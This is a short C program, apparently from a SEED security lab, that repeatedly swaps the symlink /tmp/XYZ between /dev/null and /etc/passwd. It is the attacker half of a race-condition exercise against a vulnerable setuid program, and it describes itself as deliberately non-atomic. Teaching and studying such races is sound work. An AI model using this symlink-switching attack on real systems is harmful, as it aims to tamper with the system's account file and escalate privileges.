/* SEED Task 2.B: non-atomic unlink/symlink switching, intentionally flawed. */
#define _DEFAULT_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <errno.h>

static int point_to(const char *target)
{
    if (unlink("/tmp/XYZ") == -1 && errno != ENOENT) {
        perror("unlink /tmp/XYZ (check owner and sticky bit)");
        return -1;
    }
    if (symlink(target, "/tmp/XYZ") == -1) {
        perror("symlink /tmp/XYZ (possible root-owned file in the gap)");
        return -1;
    }
    return 0;
}

int main(void)
{
    if (getuid() == 0 || geteuid() == 0) {
        fprintf(stderr, "Run this as the ordinary seed user, without sudo.\n");
        return 1;
    }
    puts("Naive switching active; Ctrl+C to stop.");
    fflush(stdout);
    for (;;) {
        if (point_to("/dev/null") == -1 || point_to("/etc/passwd") == -1)
            return 1;
    }
}
